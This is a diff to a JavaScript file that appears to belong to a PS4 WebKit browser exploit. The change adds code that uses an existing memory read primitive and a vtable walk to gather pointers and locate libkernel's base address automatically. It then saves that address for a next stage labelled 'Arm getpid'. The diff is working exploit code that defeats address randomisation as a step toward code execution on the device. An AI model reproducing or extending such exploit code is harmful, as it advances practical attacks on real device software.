@@ -2,6 +2,11 @@ import { int64 } from "./int64.js";
 import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
 import { installWindowP, pairStatus } from "./mem.js";
 import { createCrashLog } from "./log_persist.js";
+import {
+    collectLiveVtableExtPtrs,
+    resolveLibkernelFromExtList,
+    saveLibkernelSession,
+} from "./libkernel_resolve.js";
 
 const params = new URLSearchParams(location.search);
 const lines = [];
@@ -23,7 +28,7 @@ let walkQuiet = false;
 const calRetain = [];
 
 const LOG_MAX = 300;
-const BUILD_ID = "cal-20250829c";
+const BUILD_ID = "cal-20250830a";
 const crashLog = createCrashLog({
     ssLog: "wk-cal-log",
     ssState: "wk-cal-state",
@@ -1902,7 +1907,58 @@ async function walkVtableForBase() {
 
     mark("VTABLE-OK", best.label + " vtable=" + best.vtable);
     const extN = logVtableExtPtrs(p, best);
-    mark("HINT", extN + " EXT-PTR lines — paste each into index_rw → Paste libkernel");
+    mark("LK-EXT-SCAN", extN + " EXT-PTR — auto-resolving libkernel…");
+
+    const off = tableOff || offsetsFor(navigator.userAgent).off;
+    let webkitBase = manualBase;
+    if (!webkitBase && nativeFn && off && off.wk_expm1_builtin)
+        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+    if (webkitBase && off) {
+        const live = collectLiveVtableExtPtrs(p, webkitBase, off, {
+            carrier: carrierRef,
+            retain: calRetain,
+            vtableEntries: 48,
+            cellMax: 2,
+        });
+        let sessionEntries = [];
+        try {
+            const raw = sessionStorage.getItem("wk-cal-ext-ptrs");
+            if (raw) sessionEntries = JSON.parse(raw);
+        } catch (_) { }
+        const merged = [];
+        const seen = new Set();
+        function addEntry(e) {
+            const hex = (e.hex || e.ptr || "").replace(/^0x/i, "").toLowerCase();
+            if (!hex || seen.has(hex)) return;
+            seen.add(hex);
+            merged.push({ label: e.label || "ext", hex: hex, ptr: hex, code: e.code || null });
+        }
+        for (let i = 0; i < live.entries.length; i++) addEntry(live.entries[i]);
+        for (let j = 0; j < sessionEntries.length; j++) addEntry(sessionEntries[j]);
+
+        if (merged.length) {
+            const hit = resolveLibkernelFromExtList(p, webkitBase, off, merged, {
+                minVotes: 1,
+                verify: true,
+                walkPages: 48,
+            });
+            if (hit.ok && hit.lk) {
+                saveLibkernelSession(hit.lk, hit.iatRva || null);
+                mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ")");
+                mark("HINT", "index_rw → Accept lk → reload → Arm getpid");
+                state("libkernel auto OK", "ok");
+                return true;
+            }
+            mark("LK-EXT-MISS", hit.error || "no lk consensus");
+            if (hit.zeroRank && hit.zeroRank.length) {
+                for (let ri = 0; ri < hit.zeroRank.length && ri < 3; ri++) {
+                    const r = hit.zeroRank[ri];
+                    mark("LK-ZERO-RANK", (ri + 1) + " " + String(r.lk) + " votes=" + r.count);
+                }
+            }
+        }
+    }
+    mark("HINT", "ext auto miss — index_rw → Scan ext→lk after Start");
 
     let walkSt = null;
     try {
